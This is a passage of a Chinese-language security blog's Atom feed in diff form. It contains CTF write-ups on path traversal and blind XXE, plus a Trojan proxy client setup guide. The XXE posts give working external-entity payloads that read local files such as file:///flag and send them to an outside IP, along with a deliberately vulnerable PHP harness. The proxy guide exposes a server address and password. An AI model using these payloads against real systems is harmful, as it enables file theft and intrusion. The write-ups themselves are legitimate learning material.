href="http://2ebbd673-5d86-49ae-bd66-fb14c91692e7.node3.buuoj.cn/DownloadServlet?filename=xxx">http://2ebbd673-5d86-49ae-bd66-fb14c91692e7.node3.buuoj.cn/DownloadServlet?filename=xxx</a><br>然后就不知道为什么能想到../../../../..//WEB-INF/web.xml</p><p>fuzz没有好的字典。这种还是要靠积累吧。<br>然后也不知道怎么就知道：<br>../../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</p><p>因为一点servlet基础没有。是一点都看不懂。（<strong>Mark</strong>）</p><p>但是接下来就是xxe。<br>还是蛮熟悉的。哈哈哈哈哈。</p><!ENTITY % file SYSTEM "file:///flag"><!ENTITY % int "<!ENTITY &# 37; send SYSTEM 'http://174.1.80.169:1234/?p=%file;'><p>“&gt;</p><?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://174.1.80.169:1234/1.dtd"><p>%remote;%int;%send;<br>]&gt;</p><p>这个和今天刚看的那个一模一样。<br><a href="https://www.cnblogs.com/thespace/p/12400719.html">java中的xxe</a><br>[blind xxe][3]</p><p>然后就是监听+上传:</p><p>![2.PNG][4]</p><hr><p>通过xxe可以做ssrf打内网，多看几张脚本。<br>学一下poc格式。</p><p>今天没学合约，淦！！</p><p>  [3]: <a href="https://xz.aliyun.com/t/3357#">https://xz.aliyun.com/t/3357#</a> toc-8<br>  [4]: <a href="https://oss.x1a0.net/image/2020/05/15/770612564588243/2.PNG">https://oss.x1a0.net/image/2020/05/15/770612564588243/2.PNG</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;复下盘。&lt;br&gt;首先是自己唯一做出来的web。而且做了一下午，这tm还是web的签到题..&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;AreUSerialz：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+include(&amp;quot;flag.php&amp;quot;)</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
+    
+    
+    <category term="PHP" scheme="https://x1a0.net/tags/PHP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>xxe 略微深入一点体验</title>
+    <link href="https://x1a0.net/2020/05/14/142/"/>
+    <id>https://x1a0.net/2020/05/14/142/</id>
+    <published>2020-05-14T09:54:00.000Z</published>
+    <updated>2020-05-14T09:55:22.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>![3.PNG](<a href="https://oss.x1a0.net/image/2020/05/14/500332787188515/3.PNG">https://oss.x1a0.net/image/2020/05/14/500332787188515/3.PNG</a><br>  [2<a href="https://oss.x1a0.net/image/2020/05/14/500812336110548/timg.jpg">https://oss.x1a0.net/image/2020/05/14/500812336110548/timg.jpg</a>)</p><hr><p>好了，深入完了。</p><p>![timg.jpg][2]</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;![3.PNG](&lt;a href=&quot;https://oss.x1a0.net/image/2020/05/14/500332787188515/3.PNG&quot;&gt;https://oss.x1a0.net/image/2020/05/14/500332787188515/3.PN</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>blind xxe初体验</title>
+    <link href="https://x1a0.net/2020/05/14/139/"/>
+    <id>https://x1a0.net/2020/05/14/139/</id>
+    <published>2020-05-13T16:04:50.000Z</published>
+    <updated>2020-05-13T16:04:50.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>XML External Entity<br>外部实体。</p><p>XML组成模块：元素，属性，实体，PCDATA，CDATA<br>实体分为内部实体和外部实体。和文件包含差不多。当初学文件包含的时候还说这就是命名问题，叫这个憨憨实体都行。</p><p>搭建环境：</p><pre><code>&lt;?php    libxml_disable_entity_loader (false);       # 禁用加载外部实体的功能 把这个值调成false，那就是加载咯    $xmlfile = file_get_contents(&#39;php://input&#39;);    $dom = new DOMDocument();    // echo $xmlfile;    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);        # 解析成html    echo $creds;?&gt;</code></pre><p>把注释去掉就是blind xxe了。因为看不到回显????。</p><p><strong>首先是有回显的：</strong></p><p><img src="https://oss.x1a0.net/image/2020/05/13/837543782221341/1.png" alt="1.png"></p><hr><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [  &lt;!ENTITY b SYSTEM &quot;file:///d:/xxe_test.txt&quot;&gt; ]&gt; &lt;a&gt;&amp;b;&lt;/a&gt;</code></pre><p>定义了一个通用实体，然后调用。这个实体读取了xxe_test.txt。</p><p><strong>然后是没有回显的：</strong></p><pre><code>&lt;?php    libxml_disable_entity_loader (false);       # 禁用加载外部实体的功能 把这个值调成false，那就是加载咯    // $xmlfile = file_get_contents(&#39;php://input&#39;);    $xmlfile=$_POST[&#39;a&#39;];    $dom = new DOMDocument();    // echo $xmlfile;    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     // $creds = simplexml_import_dom($dom);        # 解析成html    // echo $creds;?&gt;</code></pre><p>在用这个的时候我发现使用源封装器会出错，就直接用了post。</p><p><img src="https://oss.x1a0.net/image/2020/05/13/85221431160969/2.png" alt="2.png"></p><hr><p>at first:</p><pre><code>a=&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://localhost/ctf/xxe_test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>定义一个参数实体（别问什么区别，问就是不知道）<br>然后调用这个实体：</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/xxe_test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;# 37; send SYSTEM &#39;http://127.0.0.1/?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>这里定义了三个参数实体，%remote;%int;%send;<br>按照这个执行顺序，首先获取remote，然后执行int，int去调用了file获取数据，然后执行send发回到服务器。</p><p>这里我发现vps有点抽风，就在本地搭建了。</p><pre><code>&lt;?php    file_put_contents(&#39;1.txt&#39;,$_GET[&#39;p&#39;]);?&gt;</code></pre><p>明天xxe靶机搞来深入了解下。<br>明天合约写起来，小狐狸+web3.js。<br>明天…</p><p>明日复明日，明日何其多</p><p>原罪即是正义。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;XML External Entity&lt;br&gt;外部实体。&lt;/p&gt;
+&lt;p&gt;XML组成模块：元素，属性，实体，PCDATA，CDATA&lt;br&gt;实体分为内部实体和外部实体。和文件包含差不多。当初学文件包含的时候还说这就是命名问题，叫这个憨憨实体都行。&lt;/p&gt;
+&lt;p&gt;搭建环境：&lt;/</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>trojan使用教程</title>
+    <link href="https://x1a0.net/2020/05/12/135/"/>
+    <id>https://x1a0.net/2020/05/12/135/</id>
+    <published>2020-05-12T13:19:00.000Z</published>
+    <updated>2020-11-04T07:21:51.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>客户端下载：</strong><br>[Windows](<a href="https://x1a0.net/trojan-cli-down/trojan-cli.rar">https://x1a0.net/trojan-cli-down/trojan-cli.rar</a><br>  [2<a href="https://x1a0.net/trojan-cli-down/trojan0.1.0.apk">https://x1a0.net/trojan-cli-down/trojan0.1.0.apk</a><br>  [3<a href="https://x1a0.net/trojan-cli-down/trojan-1.15.1-linux-amd64.tar.xz">https://x1a0.net/trojan-cli-down/trojan-1.15.1-linux-amd64.tar.xz</a><br>  [4<a href="https://x1a0.net/trojan-cli-down/trojan-1.15.1-macos.zip">https://x1a0.net/trojan-cli-down/trojan-1.15.1-macos.zip</a><br>  [5<a href="https://oss.x1a0.net/image/2020/05/12/8926414283168/1.png">https://oss.x1a0.net/image/2020/05/12/8926414283168/1.png</a><br>  [6<a href="https://oss.x1a0.net/image/2020/05/12/892643597831113/2.png">https://oss.x1a0.net/image/2020/05/12/892643597831113/2.png</a><br>  [7<a href="https://oss.x1a0.net/image/2020/05/15/080551058105869/Screenshot_2020-05-15-09-57-01-792_io.github.trojan_gfw.igniter.jpg">https://oss.x1a0.net/image/2020/05/15/080551058105869/Screenshot_2020-05-15-09-57-01-792_io.github.trojan_gfw.igniter.jpg</a>)<br>[Android][2]<br>[Linux][3]<br>[MAC][4]</p><p><strong>windows:</strong></p><p>打开trojan客户端，点击start（没有任何反应）<br>![1.png][5]</p><hr><p>然后来到v2ray客户端添加本地代理：<br>![2.png][6]</p><hr><p>然后就可以像用v2ray原本一样使用了。<br>不需要的时候记住一定要stop客户端。（不然会一直跑127ip上的流量。还有v2ray上的代理要关闭或者设置pac模式。）<br>pac模式，pac模式，pac模式！<br>Trojan偷跑流量+v2ray全局模式开起来，服务器要给跑崩，我心疼啊。</p><p><strong>Android：</strong><br>(安卓客户端因为没有pac选项，代理上了之后就强制全局代理，这样会导致网速很卡，强制所有流量都走VPN。这样搞被封的概率也会大大增加。)</p><p><a href="http://www.msl3.top/">www.msl3.top</a><br>443<br>15d3e9f0</p><p>很简洁就三个空，按着填下来就好了。<br>url,端口，密码</p><p>![Screenshot_2020-05-15-09-57-01-792_io.github.trojan_gfw.igniter.jpg][7]</p><hr><p>vc那个选项要关闭</p><p><strong>linux:</strong><br>和Windows同理。Linux直接就能设置代理，不用v2ray。<br>（把Windows下的config文件复制过去就好。）<br>没有可视化的直接export http_proxy=xxx。（能用上Linux这命令应该都清楚吧）<br>实测可行。</p><p>至于mac和ios。。emmm，穷。</p><p>问题1：<br>如果电脑端不可用手机端可用：<br><img src="https://oss.x1a0.net/image/2020/05/13/439432380854524/%E6%8D%95%E8%8E%B7.PNG" alt="捕获.PNG"></p><hr><p>可以如图所示把域名换成  <a href="http://www.filt.top/">www.filt.top</a><br>因为上一个多次申请免费证书被限制了。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;客户端下载：&lt;/strong&gt;&lt;br&gt;[Windows](&lt;a href=&quot;https://x1a0.net/trojan-cli-down/trojan-cli.rar&quot;&gt;https://x1a0.net/trojan-cli-down/trojan-cl</summary>
+      
+    
+    
+    
+    <category term="杂项" scheme="https://x1a0.net/categories/%E6%9D%82%E9%A1%B9/"/>
+    
+    
+  </entry>
+  
+</feed>
